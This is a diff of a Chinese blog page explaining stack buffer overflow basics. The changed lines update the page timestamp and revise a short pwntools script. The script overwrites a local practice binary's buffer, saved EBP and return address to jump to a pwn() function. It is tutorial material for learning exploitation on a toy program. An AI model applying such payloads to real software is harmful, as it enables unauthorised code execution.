@@ -29,7 +29,7 @@
 <meta property="og:image" content="https://mi1k7ea.github.com/2019/03/03/栈溢出基本原理/13.png">
 <meta property="og:image" content="https://mi1k7ea.github.com/2019/03/03/栈溢出基本原理/14.png">
 <meta property="og:image" content="https://mi1k7ea.github.com/2019/03/03/栈溢出基本原理/15.png">
-<meta property="og:updated_time" content="2019-03-03T11:02:05.038Z">
+<meta property="og:updated_time" content="2019-03-09T07:18:27.740Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="栈溢出基本原理">
 <meta name="twitter:description" content="栈溢出基本原理栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是：  程序必须向栈上写入数据。 写入的数据大小没有被良好地控制。  当函数正在执">
@@ -231,7 +231,7 @@
 <p><img src="/2019/03/03/栈溢出基本原理/14.png" alt=""></p>
 <p>得出s与函数返回地址的偏移为24，即18h=14h+4。</p>
 <h3 id="6、编写payload"><a href="#6、编写payload" class="headerlink" title="6、编写payload"></a>6、编写payload</h3><p>在下面payload中，前面14h个字节码用“a”覆盖，将EBP覆盖为“bbbb”，最后插入小端存储形式的pwn()函数地址：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./stack_test"</span>)</span><br><span class="line">pwn_addr = <span class="number">0x0804843B</span></span><br><span class="line">payload = flat([<span class="string">"a"</span> * <span class="number">0x14</span>, <span class="string">"bbbb"</span>, p32(pwn_addr)])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./stack_test"</span>)</span><br><span class="line">pwn_addr = <span class="number">0x0804843B</span></span><br><span class="line">payload = flat([<span class="string">"a"</span> * <span class="number">0x14</span>, <span class="string">"bbbb"</span>, p32(pwn_addr)])</span><br><span class="line"><span class="comment"># payload = flat(["a" * 0x14, p32(1), p32(pwn_addr)])</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> sh.recvall()</span><br></pre></td></tr></table></figure>
 <p>运行payload，直接栈溢出执行了pwn()函数：</p>
 <p><img src="/2019/03/03/栈溢出基本原理/15.png" alt=""></p>
 <p>整个栈溢出的漏洞发现及利用过程大致如此，当然还有其他的一些技巧这里还未涉及。</p>
